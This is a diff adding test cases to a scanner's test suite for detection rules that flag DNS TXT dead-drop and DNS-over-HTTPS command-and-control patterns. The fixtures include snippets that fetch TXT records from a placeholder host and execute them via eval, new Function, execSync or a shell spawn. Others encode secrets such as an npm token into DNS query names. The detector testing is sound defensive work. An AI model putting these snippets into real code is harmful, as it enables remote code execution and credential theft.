@@ -157,6 +157,27 @@ describe("C2_DOH_RESOLVER and DEAD_DROP_DNS_TXT need a C2 signal for medium", ()
     expect(performance.now() - started).toBeLessThan(performanceBudget(10_000));
   });
 
+  it("reads a base64 decode whose argument has its own parentheses", () => {
+    // A decode and a process sink, without a code sink: the decode must be seen.
+    const content = [
+      'const { execSync } = require("child_process");',
+      'dns.resolveTxt("cfg.x.example", (e, r) => {',
+      '  const cmd = Buffer.from(r.flat().join(""), "base64").toString();',
+      "  execSync(cmd);",
+      "});",
+    ].join("\n");
+    expect(severities("DEAD_DROP_DNS_TXT", content)).toEqual(["medium"]);
+  });
+
+  it("stays linear on lines of comma-separated assignments above many hits", { timeout: performanceBudget(60_000) }, () => {
+    const assignments = "a=1,".repeat(1_000);
+    const block = [assignments, assignments, assignments, assignments, assignments, "dns.resolveTxt(q);"].join("\n");
+    const content = Array.from({ length: 3_000 }, () => block).join("\n");
+    const started = performance.now();
+    severities("DEAD_DROP_DNS_TXT", content);
+    expect(performance.now() - started).toBeLessThan(performanceBudget(5_000));
+  });
+
   it("does not count comparisons with eval or Function as a sink", () => {
     const content = [
       "if (handler === eval || typeof handler == Function) throw new Error(\"blocked\");",
@@ -253,5 +274,33 @@ describe("C2_DOH_RESOLVER and DEAD_DROP_DNS_TXT need a C2 signal for medium", ()
     expect(resolvePatternSeverity(entry, oneLine, { line: 1, text: "dns.resolveTxt" }))
       .toBe("low");
     expect(performance.now() - longStarted).toBeLessThan(performanceBudget(5_000));
+  });
+});
+
+describe("C2_DOH_RESOLVER and DEAD_DROP_DNS_TXT: fifth review", () => {
+  // A TXT answer executed without a decode, encoders the query reaches through
+  // helpers, comma and member assignments, and braces inside strings or regex
+  // literals that must not close a helper.
+  it.each([
+    ["txt_eval_nodecode", "DEAD_DROP_DNS_TXT", "const dns = require(\"dns\").promises;\nasync function go() {\n  const r = await dns.resolveTxt(\"cfg.x.example\");\n  eval(r.map((c) => c.join(\"\")).join(\"\"));\n}", ["medium"]],
+    ["txt_new_function_nodecode", "DEAD_DROP_DNS_TXT", "const r = await dns.resolveTxt(\"cfg.x.example\");\nnew Function(r.flat().join(\"\"))();", ["medium"]],
+    ["txt_join_then_base64", "DEAD_DROP_DNS_TXT", "const r = await dns.resolveTxt(\"cfg.x.example\");\nconst code = Buffer.from(r.flat().join(\"\"), \"base64\").toString();\neval(code);", ["medium"]],
+    ["txt_enc_variable", "DEAD_DROP_DNS_TXT", "const ENC = \"base64\";\nconst r = await dns.resolveTxt(\"cfg.x.example\");\nconst code = Buffer.from(r[0][0], ENC).toString();\neval(code);", ["medium"]],
+    ["txt_hex_decode_parseint", "DEAD_DROP_DNS_TXT", "const r = await dns.resolveTxt(\"cfg.x.example\");\nconst code = r[0][0].match(/../g).map((h) => String.fromCharCode(parseInt(h, 16))).join(\"\");\neval(code);", ["medium"]],
+    ["txt_spawn_sh", "DEAD_DROP_DNS_TXT", "const { spawn } = require(\"node:child_process\");\nconst r = await dns.resolveTxt(\"cfg.x.example\");\nspawn(\"sh\", [\"-c\", r.flat().join(\"\")]);", ["medium"]],
+    ["query_multiline_call", "DEAD_DROP_DNS_TXT", "await dns.resolveTxt(\n  base32(secret) + \".x.example\",\n);", ["medium"]],
+    ["query_helper_far_above", "DEAD_DROP_DNS_TXT", "function enc(s) {\n  return Buffer.from(s).toString(\"hex\");\n}\nconst a = 1;\nconst b = 2;\nconst c = 3;\nconst d = 4;\nconst e = 5;\nconst label = enc(process.env.NPM_TOKEN);\nawait dns.resolveTxt(label + \".x.example\");", ["medium"]],
+    ["query_helper_brace_in_string", "DEAD_DROP_DNS_TXT", "function enc(s) {\n  const close = \"}\";\n  return Buffer.from(s).toString(\"hex\") + close;\n}\nawait dns.resolveTxt(enc(secret) + \".x.example\");", ["medium"]],
+    ["query_helper_brace_in_regex", "DEAD_DROP_DNS_TXT", "function enc(s) {\n  s = s.replace(/}/g, '');\n  return Buffer.from(s).toString(\"hex\");\n}\nawait dns.resolveTxt(enc(secret) + \".x.example\");", ["medium"]],
+    ["query_comma_decl", "DEAD_DROP_DNS_TXT", "const n = 1, label = base32(secret);\nawait dns.resolveTxt(label + \".x.example\");", ["medium"]],
+    ["query_member_assign", "DEAD_DROP_DNS_TXT", "q.name = base32(secret);\nawait dns.resolveTxt(q.name + \".x.example\");", ["medium"]],
+    ["query_tostring16", "DEAD_DROP_DNS_TXT", "const label = [...secret].map((c) => c.charCodeAt(0).toString(16)).join(\"\");\nawait dns.resolveTxt(label + \".x.example\");", ["medium"]],
+    ["query_backtick_hex", "DEAD_DROP_DNS_TXT", "const label = Buffer.from(secret).toString(`hex`);\nawait dns.resolveTxt(label + \".x.example\");", ["medium"]],
+    ["query_arrow_helper", "DEAD_DROP_DNS_TXT", "const enc = (s) => Buffer.from(s).toString(\"hex\");\nawait dns.resolveTxt(enc(secret) + \".x.example\");", ["medium"]],
+    ["query_arrow_helper_multiline", "DEAD_DROP_DNS_TXT", "const enc = (s) =>\n  Buffer.from(s).toString(\"hex\");\nawait dns.resolveTxt(enc(secret) + \".x.example\");", ["medium"]],
+    ["benign_dnssec_hex", "C2_DOH_RESOLVER", "const res = await fetch(\"https://dns.google/resolve?name=\" + d + \"&type=DS\");\nconst digest = createHash(\"sha256\").update(x).digest().toString(\"hex\");", ["low"]],
+    ["benign_helper_unclosed_brace_string", "DEAD_DROP_DNS_TXT", "function fmt(s) {\n  const open = \"{\";\n  return s;\n}\nconst hash = createHash(\"md5\").update(x).digest(\"hex\"); const tag = Buffer.from(y).toString(\"hex\");\nawait dns.resolveTxt(fmt(domain));", ["low"]],
+  ] as Array<[string, string, string, Severity[]]>)("%s", (_name, rule, content, expected) => {
+    expect(severities(rule, content)).toEqual(expected);
   });
 });
